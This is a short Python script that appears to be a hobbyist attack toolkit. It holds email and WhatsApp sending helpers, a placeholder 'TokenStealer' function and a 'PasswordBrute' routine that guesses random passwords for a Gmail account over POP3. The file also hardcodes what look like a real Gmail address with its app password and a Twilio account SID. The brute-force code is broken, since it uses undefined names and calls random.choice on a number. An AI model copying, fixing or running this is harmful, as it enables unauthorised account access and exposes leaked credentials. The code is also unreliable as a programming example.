from twilio.rest import Client
import socket,time,smtplib,ssl,random,poplib,os,hashlib,string
from email.message import EmailMessage
from datetime import datetime
from webbot import Browser
from scapy.all import *


def CheckValue(type_word):
    try:
        int(type_word)
        return True
    except:
        return False







""" Core Functions  """
def EmailSender(email_receiver,subject,body):

  try:
    email_sender = 'god237056@gmail.com'
    email_password = 'kqggsowvbfkppmwq'
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.set_content(body)
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_password)
        smtp.sendmail(email_sender, email_receiver, em.as_string())
  except Exception as e:
    print(e)


    
    
def TokenStealer():
  print("Under development")
  
 
def PasswordBrute(user,length):

    chars = strings.printable
    Server = "pop.gmail.com"
   
    
    Digits = length

    def PasswordBruteSub(Server,email,length,Digits):




        if CheckValue(Digits):
            length_start = int(Digits)
            length_finish = int(Digits)
            length = int(Digits)
            Password =  [random.choice(length) for _ in range(int(Digits))]
            try:
                web = poplib.POP3_SSL(Server)
                web.user(email)
                web.pass_(Password)

            except:
                print("trying:",Password)
                PasswordBruteSub(Server,email,type_password,Digits)
            else:
                print("Password:",Password)
                

        else:
            print("did not understand")
            


    PasswordBruteSub(Server,user,type_password,Digits)
def SMSMessenger(WhatBody,WhatTo):
  try:
    account_sid = 'AC00cd421478720ebe4d49869ac05376cb'
    auth_token = '[AuthToken]'
    client = Client(account_sid, auth_token)
    
    message = client.messages.create(
      from_='whatsapp:+14155238886',
      body=WhatBody,
      to=WhatTo
    )
    
    
    print(message.sid)
    
  except Exception as e:
    print("Error " + e)


    
